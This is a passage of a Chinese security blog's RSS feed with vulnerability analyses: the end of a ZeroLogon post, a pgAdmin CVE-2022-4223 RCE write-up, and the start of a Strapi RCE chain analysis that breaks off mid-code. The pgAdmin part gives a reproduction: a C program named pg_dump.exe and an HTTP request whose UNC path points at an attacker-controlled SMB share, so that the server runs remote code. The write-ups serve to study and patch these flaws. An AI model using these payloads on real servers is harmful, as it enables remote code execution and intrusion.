&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    cipher &lt;span style="color:#f92672">=&lt;/span> Cipher(algorithms&lt;span style="color:#f92672">.&lt;/span>AES(key),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                    modes&lt;span style="color:#f92672">.&lt;/span>CFB8(iv),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                    backend&lt;span style="color:#f92672">=&lt;/span>default_backend())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    encryptor &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>encryptor()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    ciphertext &lt;span style="color:#f92672">=&lt;/span> encryptor&lt;span style="color:#f92672">.&lt;/span>update(plaintext) &lt;span style="color:#f92672">+&lt;/span> encryptor&lt;span style="color:#f92672">.&lt;/span>finalize()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    print(ciphertext&lt;span style="color:#f92672">.&lt;/span>hex())
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在第115次时，加密后的密文为0x0000000000000000
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/zero-logon.zh-cn.assets/3.png" />
&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://xz.aliyun.com/t/8367" target="_blank">https://xz.aliyun.com/t/8367&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.anquanke.com/post/id/219374#h3-6" target="_blank">https://www.anquanke.com/post/id/219374#h3-6&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.secrss.com/articles/25580" target="_blank">https://www.secrss.com/articles/25580&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-08T14:39:28+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2022-4223 PgAdmin RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</link><pubDate>Mon, 08 May 2023 14:18:21 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>略&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>pgadmin &amp;lt; 6.17&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>windows 10&lt;/li>
&lt;li>postgresql13&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>复现&lt;/strong>
直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;stdlib&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;whoami &amp;gt; c:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">users&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">public&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">1.txt&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。
发送如下payload，在utility_path指向共享的文件夹路径，&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /misc/validate_binary_path &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">[TARGETHOST]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">[COOKIES_YOU_FETCHED_IN_ADVANCE]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-pgA-CSRFToken&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">[CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://[TARGETHOST]/browser/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">[n]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;utility_path&amp;#34;&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">&amp;#34;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&amp;#34;}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>分析&lt;/strong>
在 &lt;code>validate_binary_path&lt;/code>路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的 &lt;code>utility_path&lt;/code>，这个函数接收 &lt;code>utility_path&lt;/code>并使用 &lt;code>os.path.abspath(os.path.join&lt;/code>拼接路径，而 &lt;code>os.path.join&lt;/code>可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有 &lt;code>pg_dump.exe&lt;/code>，传入UNC路径，pgadmin就会获取到这个文件并执行，导致代码执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@blueprint.route&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/validate_binary_path&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> endpoint&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;validate_binary_path&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methods&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>]) &lt;span style="color:#75715e"># [1]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">validate_binary_path&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> This function is used to validate the specified utilities path by
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> running the utilities with there versions.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> hasattr(request&lt;span style="color:#f92672">.&lt;/span>data, &lt;span style="color:#e6db74">&amp;#39;decode&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>data&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> data &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version_str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;utility_path&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data &lt;span style="color:#f92672">and&lt;/span> data[&lt;span style="color:#e6db74">&amp;#39;utility_path&amp;#39;&lt;/span>] &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>: &lt;span style="color:#75715e"># [2]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check if &amp;#34;$DIR&amp;#34; present in binary path&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binary_path &lt;span style="color:#f92672">=&lt;/span> replace_binary_path(data[&lt;span style="color:#e6db74">&amp;#39;utility_path&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># [3]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> utility &lt;span style="color:#f92672">in&lt;/span> UTILITIES_ARRAY: &lt;span style="color:#75715e"># [4]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> full_path &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>abspath(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(binary_path,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (utility &lt;span style="color:#66d9ef">if&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>name &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;nt&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (utility &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;.exe&amp;#39;&lt;/span>)))) &lt;span style="color:#75715e"># [5]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get the output of the &amp;#39;--version&amp;#39; command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version_string &lt;span style="color:#f92672">=&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> subprocess&lt;span style="color:#f92672">.&lt;/span>getoutput(&lt;span style="color:#e6db74">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74">&amp;#34; --version&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(full_path)) &lt;span style="color:#75715e"># [6]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get the version number by splitting the result string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version_string&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;) &amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>补丁&lt;/strong>
补丁中增加了身份验证，并且在拼接路径时使用os.path.exists检查是否存在，不存在则报错。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-4223-PgAdmin-RCE.zh-cn.assets/patch.png" />&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞原理较为简单，python的函数可以接收UNC路径，而开发者并未考虑到这一点，导致可以传入UNC路径达成远程代码执行。值得注意的是这个漏洞是靠codeql审计出来的。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html" target="_blank">https://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-08T14:18:21+08:00&lt;/strong>&lt;/p></description></item><item><title>Strapi RCE 漏洞链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</link><pubDate>Fri, 05 May 2023 21:06:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>该漏洞利用链由两个漏洞组成：Strapi 远程代码执行漏洞(CVE-2023-22621)和Strapi 信息泄露漏洞(CVE-2023-22894)&lt;/p>
&lt;p>Strapi 远程代码执行漏洞(CVE-2023-22621)为后台SSTI模板注入，在Strapi管理面板的Users &amp;amp; Permissions plugin可以设置确认邮件模板，在模板处存在模板注入，当开启邮件确认选项时将渲染该模板，触发漏洞，利用该漏洞需要后台管理员权限，以修改模板。&lt;/p>
&lt;p>Strapi 信息泄露漏洞(CVE-2023-22894)，Strapi 信息泄露漏洞(CVE-2023-22894)是由于Strapi在查询时，只是在查询结果中删除了敏感字段，在实际查询语句中仍然可以使用该敏感字段，所以攻击者可以通过观察Strapi服务端返回的数据，猜测所输入的敏感字段是否正确，即攻击者可以通过暴力破解，将敏感字段爆破出来&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;pre tabindex="0">&lt;code>Strapi ≤ 4.5.5
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>参考
&lt;a href="https://razinj.dev/how-to-run-strapi-4-in-a-docker-container-using-docker-compose/" target="_blank">https://razinj.dev/how-to-run-strapi-4-in-a-docker-container-using-docker-compose/&lt;/a>，使用&lt;code>npx create-strapi-app@4.5.5 app&lt;/code> 命令启动&lt;code>strapi v4.5.5&lt;/code>并且用&lt;code>docker&lt;/code>起数据库。&lt;/p>
&lt;p>docker-compose.yml:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">version&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;3&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">services&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">postgres&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">image&lt;/span>: &lt;span style="color:#ae81ff">postgres&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">restart&lt;/span>: &lt;span style="color:#ae81ff">always&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">volumes&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#ae81ff">pgdata:/var/lib/postgresql/data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">environment&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">POSTGRES_USER&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">POSTGRES_PASSWORD&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">POSTGRES_DB&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">ports&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#e6db74">&amp;#39;5432:5432&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">mysql&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">image&lt;/span>: &lt;span style="color:#ae81ff">mysql:5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">restart&lt;/span>: &lt;span style="color:#ae81ff">always&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">command&lt;/span>: --&lt;span style="color:#ae81ff">default-authentication-plugin=mysql_native_password&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">environment&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">MYSQL_DATABASE&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">MYSQL_USER&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">MYSQL_PASSWORD&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">MYSQL_ROOT_HOST&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">MYSQL_ROOT_PASSWORD&lt;/span>: &lt;span style="color:#ae81ff">strapi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">volumes&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#ae81ff">mysqldata:/var/lib/mysql&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">ports&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#e6db74">&amp;#39;3306:3306&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">volumes&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">pgdata&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">mysqldata&lt;/span>:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于strapi监听在localhost，通过ssh把1337端口转发出来&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh -CfNg -L 127.0.0.1:1337:127.0.0.1:1337 [root@192.168.59.197]
&lt;/code>&lt;/pre>&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>该漏洞利用链由两个漏洞组成，分别是Strapi 远程代码执行漏洞(CVE-2023-22621)和Strapi 信息泄露漏洞(CVE-2023-22894)。&lt;/p>
&lt;p>Strapi 远程代码执行漏洞(CVE-2023-22621)是由服务端模板注入导致，在Strapi的管理面板的Users &amp;amp; Permissions plugin可以设置确认邮件模板，该模板由lodash 模板引擎渲染，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;use strict&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;lodash&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">getProviderSettings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">strapi&lt;/span>.&lt;span style="color:#a6e22e">config&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;plugin.email&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">async&lt;/span> (&lt;span style="color:#a6e22e">options&lt;/span>) =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">strapi&lt;/span>.&lt;span style="color:#a6e22e">plugin&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;email&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">provider&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">options&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * fill subject, text and html using lodash template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @param {object} emailOptions - to, from and replyto...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @param {object} emailTemplate - object containing attributes to fill
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @param {object} data - data used to fill the template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @returns {{ subject, text, subject }}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sendTemplatedEmail&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">emailOptions&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {}, &lt;span style="color:#a6e22e">emailTemplate&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {}, &lt;span style="color:#a6e22e">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {}) =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">attributes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;subject&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;text&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;html&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">missingAttributes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span>.&lt;span style="color:#a6e22e">difference&lt;/span>(&lt;span style="color:#a6e22e">attributes&lt;/span>, Object.&lt;span style="color:#a6e22e">keys&lt;/span>(&lt;span style="color:#a6e22e">emailTemplate&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">missingAttributes&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Error(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">`Following attributes are missing from your email template : &lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">missingAttributes&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;, &amp;#39;&lt;/span>)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">templatedAttributes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">attributes&lt;/span>.&lt;span style="color:#a6e22e">reduce&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#a6e22e">compiled&lt;/span>, &lt;span style="color:#a6e22e">attribute&lt;/span>) =&amp;gt;
